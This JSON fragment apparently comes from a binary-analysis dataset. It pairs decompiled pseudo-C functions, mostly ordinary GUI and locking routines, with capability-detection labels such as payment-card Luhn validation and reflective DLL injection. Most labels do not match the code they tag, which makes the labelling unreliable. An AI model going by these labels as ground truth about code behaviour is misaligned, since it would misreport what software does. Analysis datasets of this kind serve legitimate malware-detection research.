        "decompiled_code": "\nvoid __fastcall fcn.00425634(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack1080;\n    uint uStack1076;\n    uchar *puStack1072;\n    uint uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uint uStack1056;\n    uint var_410h;\n    uint hgdiobj;\n    uint hdc;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((in_EAX != 0) && (*(param_1 + 0x26) < 9)) {\n        uStack1056 = 0x42566a;\n        var_4h = param_2;\n        iVar1 = fcn.0042282c();\n        if (iVar1 != 0) {\n            uStack1056 = 0;\n            uStack1060 = 0x425677;\n            uStack1060 = sub.user32.dll_GetDC();\n            uStack1064 = 0x425683;\n            var_8h = uStack1060;\n            uStack1068 = sub.gdi32.dll_CreateCompatibleDC();\n            puStack1072 = 0x425690;\n            hdc = uStack1068;\n            hgdiobj = sub.gdi32.dll_SelectObject();\n            uStack1076 = 0x4256e3;\n            uStack1080 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffbc8;\n            uVar2 = hdc;\n            puStack1072 = &stack0xfffffffc;\n            sub.gdi32.dll_SetDIBColorTable(hdc, 0, iVar1, &fcn.00425634::var_410h);\n            *in_FS_OFFSET = uVar2;\n            sub.gdi32.dll_SelectObject(hdc, hgdiobj, 0x4256ea);\n            sub.gdi32.dll_DeleteDC(hdc);\n            sub.user32.dll_ReleaseDC(0, var_8h);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 465
    },
    "004260b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004260b4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff80;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint var_58h;\n    int32_t var_4h;\n    \n    var_4h = in_EAX;\n    if (param_2 != 0) {\n        uStack104 = 0x4260d2;\n        cVar1 = fcn.004040e4();\n        if (cVar1 == '\\0') {\n            uStack104 = 0x4261a7;\n            fcn.00415504();\n            return;\n        }\n    }\n    uStack104 = 0x4260e2;\n    fcn.00426880();\n    uStack104 = 0x49636c;\n    puStack108 = 0x4260ec;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack112 = 0x426176;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (param_2 == 0) {\n        puStack108 = &stack0xfffffffc;\n        fcn.00403720();\n        in_stack_ffffff80 = 0;\n        fcn.00426b50(0, 0, &fcn.004260b4::var_58h);\n    }\n    else {\n        puStack108 = &stack0xfffffffc;\n        fcn.00425568();\n        fcn.0042556c();\n        *(var_4h + 0x28) = *(param_2 + 0x28);\n        *(var_4h + 0x21) = *(param_2 + 0x21);\n        *(var_4h + 0x34) = *(param_2 + 0x34);\n        *(var_4h + 0x38) = *(param_2 + 0x38);\n    }\n    *in_FS_OFFSET = in_stack_ffffff80;\n    sub.kernel32.dll_LeaveCriticalSection(0x49636c, 0x42617d);\n    return;\n}\n",
        "token_count": 500
    },
    "004261b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004261b0(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint var_5ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = &fcn.004261b0::var_5ch;\n    for (iVar1 = 0x15; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        puVar2 = puVar2 + 1;\n    }\n    puStack112 = 0x4261d5;\n    fcn.00426880();\n    var_4h = 0;\n    var_8h = 0;\n    uStack116 = 0x426240;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    iVar1 = in_ECX;\n    if (in_ECX != *0x496350) {\n        puStack112 = &stack0xfffffffc;\n        iVar1 = fcn.00425da0();\n    }\n    var_8h = iVar1;\n    var_4h = fcn.0042573c(*(in_EAX + 0x2c), &fcn.004261b0::var_5ch);\n    uVar3 = 0;\n    fcn.00426b50(0, *(*(in_EAX + 0x28) + 0x70), &fcn.004261b0::var_5ch);\n    *in_FS_OFFSET = uVar3;\n    return;\n}\n",
        "token_count": 429
    },
    "00426270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426270(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    fcn.00426564();\n    iVar1 = *(in_EAX + 0x28);\n    *(iVar1 + 0x50) = 0;\n    *(iVar1 + 0x54) = 0;\n    fcn.0040e118();\n    return;\n}\n",
        "token_count": 90
    },
    "004262a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.004262a0(void)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    uint *arg_8h;\n    int32_t iVar2;\n    uint *puVar3;\n    ulong uVar4;\n    \n    arg_8h = fcn.00403f28();\n    (**(*in_EAX + 0x58))();\n    uVar4 = (***arg_8h)();\n    fcn.004175b4(uVar4, uVar4 >> 0x20);\n    puVar3 = in_EAX[10] + 0x18;\n    puVar1 = &stack0xffffff98;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar1 = puVar1 + 1;\n    }\n    fcn.00426880();\n    fcn.0040e118();\n    fcn.00426b50(arg_8h, *(in_EAX[10] + 0x70), &stack0xffffff98);\n    return;\n}\n",
        "token_count": 262
    },
    "00426754": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00426754(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.00426270();\n    iVar1 = *(in_EAX + 0x28);\n    if ((param_2 < 0) || (*(iVar1 + 0x20) <= param_2)) {\n        fcn.00421f40();\n    }\n    fcn.0042680c();\n    sub.gdi32.dll_GdiFlush();\n    if (0 < *(iVar1 + 0x38)) {\n        param_2 = (*(iVar1 + 0x38) - param_2) + -1;\n    }\n    iVar2 = fcn.00422220();\n    return iVar2 * param_2 & 0xffffffff00000000U | iVar2 * param_2 + *(iVar1 + 0x2c);\n}\n",
        "token_count": 212
    },
    "00427a94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427a94(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    ushort *in_EDX;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY124;\n    uint uStackY120;\n    uchar *puStackY116;\n    uint var_58h;\n    uint var_44h;\n    uint var_40h;\n    uint *var_4h;\n    \n    *in_EDX = 2;\n    fcn.00426890();\n    puVar3 = *(in_EAX + 0x28) + 0x18;\n    puVar4 = &fcn.00427a94::var_58h;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_40h = 0;\n    var_44h = 0;\n    puStackY116 = 0x427ae1;\n    uVar1 = fcn.0042573c(*(in_EAX + 0x2c), &fcn.00427a94::var_58h);\n    *var_4h = uVar1;\n    uStackY120 = 0x427b0e;\n    uStackY124 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff84;\n    puStackY116 = &stack0xfffffffc;\n    uVar1 = fcn.00425da0();\n    *arg_8h = uVar1;\n    *in_FS_OFFSET = uStackY124;\n    return;\n}\n",
        "token_count": 406
    },
    "00427be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00427be0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0042322c();\n    *(in_EAX + 0x21) = 1;\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 0x28) = uVar1;\n    fcn.00425568();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 193
    },
    "00427e88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00427e88(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    puStack32 = 0x427ea1;\n    piVar1 = fcn.00403f28();\n    uStack36 = 0x427f16;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    uVar2 = (***param_2)();\n    fcn.00417530(uVar2);\n    (**(*piVar1 + 4))();\n    (***piVar1)();\n    fcn.0041775c();\n    fcn.0041775c();\n    if (1 < var_ah._2_2_) {\n        fcn.00421f7c();\n    }\n    fcn.00427f40();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x427f36;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 300
    },
    "004280f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.004280f8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    int32_t iStack76;\n    uint uStack72;\n    uint uStack68;\n    uchar uStack32;\n    \n    uVar3 = 1;\n    uStack68 = 0;\n    uStack72 = 0x428106;\n    iVar1 = sub.user32.dll_GetDC();\n    if (iVar1 != 0) {\n        uStack72 = *0x496364;\n        iStack76 = iVar1;\n        iVar2 = sub.gdi32.dll_SelectObject();\n        if (iVar2 != 0) {\n            iVar2 = sub.gdi32.dll_GetTextMetricsA(iVar1, &stack0xffffffb4);\n            if (iVar2 != 0) {\n                uVar3 = uStack32;\n            }\n        }\n        sub.user32.dll_ReleaseDC(0, iVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 217
    },
    "0042837c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042837c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "00428388": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00428388(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "00428548": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00428548(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(in_EAX + 4);\n    if (puVar1 == NULL) {\n        return;\n    }\n    uStack28 = 0x428566;\n    fcn.0042837c();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(in_EAX + 4) = *puVar1;\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x42859c;\n    uStack32 = 0x428594;\n    fcn.00428388();\n    return;\n}\n",
        "token_count": 201
    },
    "0042ca80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042ca80(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0044f210();\n    *(in_EAX + 0x50) = *0x42cad8;\n    fcn.00444c6c();\n    fcn.00444ca0();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 173
    },
    "0042d014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042d014(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0044e820();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x42d0a4;\n    fcn.00444c6c();\n    fcn.00444ca0();\n    *(in_EAX + 0x19d) = 1;\n    *(in_EAX + 0x1a0) = 1;\n    fcn.00437d14();\n    cVar1 = fcn.00437e1c();\n    if (cVar1 == '\\0') {\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x42d0a8;\n    }\n    else {\n        *(in_EAX + 0x50) = ~*0x42d0a8 & *(in_EAX + 0x50);\n    }\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 330
    },
    "0042db98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042db98(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x42dbb2;\n    (**(*in_EAX + 0xe0))();\n    puStack32 = 0x42dbbe;\n    (**(*in_EAX + 0xdc))();\n    puStack32 = 0x42dbc8;\n    fcn.0044551c();\n    puStack32 = 0x42dbce;\n    fcn.004097a4();\n    uStack36 = 0x42dc22;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.004097b8();\n    fcn.0044552c();\n    fcn.004095dc();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42dc29;\n    uStack36 = 0x42dc21;\n    fcn.004097f0();\n    return;\n}\n",
        "token_count": 278
    },
    "0042dc34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042dc34(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42dc4b;\n    (**(*in_EAX + 0xe0))();\n    puStack28 = 0x42dc58;\n    iVar1 = (**(*in_EAX + 0xdc))();\n    puStack28 = 0x42dc65;\n    fcn.00404e90();\n    if (iVar1 != 0) {\n        puStack28 = 0x42dc70;\n        fcn.0044551c();\n        puStack28 = 0x42dc76;\n        fcn.004097a4();\n        uStack32 = 0x42dcc2;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        fcn.004097b8();\n        fcn.0044552c();\n        fcn.00402ee0();\n        *in_FS_OFFSET = uStack36;\n        puStack28 = 0x42dcc9;\n        uStack32 = 0x42dcc1;\n        fcn.004097f0();\n        return;\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "0042ea88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042ea88(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0042e25c();\n    fcn.00444c6c();\n    fcn.00444ca0();\n    *(in_EAX + 0x50) = *0x42eae4;\n    *(in_EAX + 600) = 1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 188
    },
    "0042f000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f000(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x42f137;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    if ((arg_8h < in_ECX) || (puVar1 = &stack0xfffffffc,  arg_8h < in_EAX[0x98])) {\n        fcn.00406a50();\n        fcn.0040c5ac();\n        fcn.004047cc();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    if (in_EDX < in_ECX) {\n        in_EDX = in_ECX;\n    }\n    if (arg_8h < in_EDX) {\n        in_EDX = arg_8h;\n    }\n    if ((in_EAX[0x96] != in_ECX) || (arg_8h != in_EAX[0x97])) {\n        in_EAX[0x96] = in_ECX;\n        in_EAX[0x97] = arg_8h;\n        cVar2 = fcn.0044d568();\n        if (cVar2 != '\\0') {\n            uStack56 = fcn.0044d1c8(2, in_ECX, arg_8h, -(in_EDX == in_EAX[0x95]));\n            sub.user32.dll_SetScrollRange();\n        }\n    }\n    if (in_EDX != in_EAX[0x95]) {\n        in_EAX[0x95] = in_EDX;\n        cVar2 = fcn.0044d568();\n        if (cVar2 != '\\0') {\n            cVar2 = fcn.0042efa4();\n            if (cVar2 == '\\0') {\n                uVar3 = fcn.0044d1c8(2, in_EAX[0x97] - in_EAX[0x95], 0xffffffff);\n                sub.user32.dll_SetScrollPos(uVar3);\n            }\n            else {\n                uVar3 = fcn.0044d1c8(2, in_EAX[0x95], 0xffffffff);\n                sub.user32.dll_SetScrollPos(uVar3);\n            }\n        }\n        (**(*in_EAX + 0x68))();\n        fcn.00404154();\n    }\n    *in_FS_OFFSET = uStack56;\n    fcn.00404da0(0x42f13e);\n    return;\n}\n",
        "token_count": 657
    },
    "00430444": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00430444(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    double dVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    dVar1 = CONCAT44(noname_1, noname_0);\n    if (dVar1 < *0x43051c) {\n        dVar1 = dVar1 + *0x430520;\n    }\n    if (*0x430520 < dVar1) {\n        dVar1 = dVar1 - *0x430520;\n    }\n    if (*0x430524 <= dVar1) {\n        if (*0x43052c <= dVar1) {\n            if (*0x430530 <= dVar1) {\n                _var_8h = CONCAT44(arg_1ch, arg_18h);\n            }\n            else {\n                _var_8h = ((*0x430530 - dVar1) * (CONCAT44(arg_14h, arg_10h) - CONCAT44(arg_1ch, arg_18h)) + *0x430528)\n                          / *0x430524 + CONCAT44(arg_1ch, arg_18h);\n            }\n        }\n        else {\n            _var_8h = CONCAT44(arg_14h, arg_10h);\n        }\n    }\n    else {\n        _var_8h = ((CONCAT44(arg_14h, arg_10h) - CONCAT44(arg_1ch, arg_18h)) * dVar1 + *0x430528) / *0x430524 +\n                  CONCAT44(arg_1ch, arg_18h);\n    }\n    fcn.00403154(_var_8h);\n    return;\n}\n",
        "token_count": 426
    },
    "00430784": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00430784(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uchar *arg_8h;\n    uint uStack20;\n    uchar auStack16 [4];\n    \n    iVar1 = fcn.00406b88();\n    if (in_EAX == *(iVar1 + 0x34)) {\n        iVar1 = fcn.00406b88();\n        if (param_2 == *(iVar1 + 0x38)) {\n            iVar1 = fcn.00406b88();\n            uVar2 = *(iVar1 + 0x3c);\n            goto code_r0x00430807;\n        }\n    }\n    arg_8h = auStack16;\n    fcn.0042074c();\n    fcn.00430124(arg_8h);\n    uVar2 = fcn.00430560();\n    iVar1 = fcn.00406b88();\n    *(iVar1 + 0x34) = in_EAX;\n    iVar1 = fcn.00406b88();\n    *(iVar1 + 0x38) = param_2;\n    iVar1 = fcn.00406b88();\n    *(iVar1 + 0x3c) = uVar2;\ncode_r0x00430807:\n    return CONCAT44(uStack20, uVar2);\n}\n",
        "token_count": 312
    },
    "00430810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.00430810(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack20;\n    uchar auStack16 [4];\n    \n    iVar1 = fcn.00406b88();\n    if (in_EAX == *(iVar1 + 0x2c)) {\n        iVar1 = fcn.00406b88();\n        if (param_2 == *(iVar1 + 0x28)) {\n            iVar1 = fcn.00406b88();\n            uVar2 = *(iVar1 + 0x30);\n            goto code_r0x004308c6;\n        }\n    }\n    if ((in_EAX == -0xfffff1) && (param_2 == -0x32)) {\n        uVar2 = 0xff000010;\n    }\n    else {\n        fcn.0042074c();\n        fcn.00430124(auStack16);\n        if (uStack20 < 0xa0) {\n            uVar2 = fcn.00430784();\n        }\n        else {\n            uVar2 = fcn.00430560();\n        }\n    }\n    iVar1 = fcn.00406b88();\n    *(iVar1 + 0x28) = param_2;\n    iVar1 = fcn.00406b88();\n    *(iVar1 + 0x2c) = in_EAX;\n    iVar1 = fcn.00406b88();\n    *(iVar1 + 0x30) = uVar2;\ncode_r0x004308c6:\n    return CONCAT44(uStack20, uVar2);\n}\n",
        "token_count": 381
    },
    "004308d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004308d0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uint *puVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint auStack36 [5];\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = *in_ECX;\n    var_4h = in_ECX[1];\n    if (in_EAX != 0) {\n        var_ch = fcn.004214cc();\n        fcn.004211ec();\n        fcn.004214d4();\n        fcn.00402ee0();\n        iVar2 = 3;\n        puVar1 = &var_24h;\n        do {\n            fcn.00413a6c();\n            *puVar1 = var_2ch;\n            puVar1[1] = var_28h;\n            puVar1 = puVar1 + 2;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n        fcn.004212f8();\n        fcn.00421300();\n        fcn.0042197c();\n        fcn.00421300();\n        fcn.004214d4();\n    }\n    return;\n}\n",
        "token_count": 303
    },
    "00433a74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433a74(uint arg_8h)\n\n{\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004211f4();\n    fcn.004219b8();\n    fcn.004211f4();\n    fcn.004219b8();\n    return;\n}\n",
        "token_count": 127
    },
    "00433b38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433b38(int32_t arg_8h)\n\n{\n    int32_t in_EDX;\n    uint var_ch;\n    uint var_8h;\n    uint lprc;\n    \n    fcn.00421300();\n    *(in_EDX + 0xc) = *(in_EDX + 0xc) + -1;\n    *(in_EDX + 8) = *(in_EDX + 8) + -1;\n    if (0 < arg_8h) {\n        do {\n            arg_8h = arg_8h + -1;\n            fcn.00433a74(&stack0xfffffffc);\n            sub.user32.dll_InflateRect();\n        } while (0 < arg_8h);\n    }\n    *(in_EDX + 0xc) = *(in_EDX + 0xc) + 1;\n    *(in_EDX + 8) = *(in_EDX + 8) + 1;\n    return;\n}\n",
        "token_count": 215
    },
    "00433dac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00433dac(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStackY52;\n    uint uStackY48;\n    uchar *puStackY44;\n    uint var_18h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1c) & 0x10) != 0) {\n        fcn.004212d0();\n        fcn.004215f0();\n        puStackY44 = 0x433df5;\n        fcn.004219f4(*(in_EAX + 0x4c), *(in_EAX + 0x48));\n    }\n    uVar1 = *(in_EAX + 0x1ac);\n    *(in_EAX + 0x1ac) = 1;\n    uStackY48 = 0x433e5f;\n    uStackY52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStackY44 = &stack0xfffffffc;\n    fcn.00433c80();\n    fcn.00421a3c();\n    *in_FS_OFFSET = uStackY52;\n    *(in_EAX + 0x1ac) = uVar1;\n    return;\n}\n",
        "token_count": 288
    },
    "00434224": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434224(uint arg_8h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004211f4();\n    fcn.00413a6c();\n    fcn.00413a6c();\n    fcn.00413a6c();\n    fcn.004219b8();\n    fcn.004211f4();\n    fcn.00413a6c();\n    fcn.00413a6c();\n    fcn.00413a6c();\n    fcn.004219b8();\n    return;\n}\n",
        "token_count": 200
    },
    "004347b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004347b0(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0044f210();\n    in_EAX[0x14] = *0x43487c;\n    fcn.00437d14();\n    cVar1 = fcn.00437e1c();\n    if (cVar1 != '\\0') {\n        in_EAX[0x14] = ~*0x434884 & (in_EAX[0x14] | *0x434880);\n    }\n    fcn.00444c6c();\n    fcn.00444ca0();\n    *(in_EAX + 0x9a) = 2;\n    *(in_EAX + 0x269) = 2;\n    fcn.00434c38();\n    fcn.00434c54();\n    *(in_EAX + 0x99) = 0;\n    fcn.0044574c();\n    *(in_EAX + 0x265) = 1;\n    fcn.0044d4f8();\n    (**(*in_EAX + 200))();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 358
    },
    "00434a7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
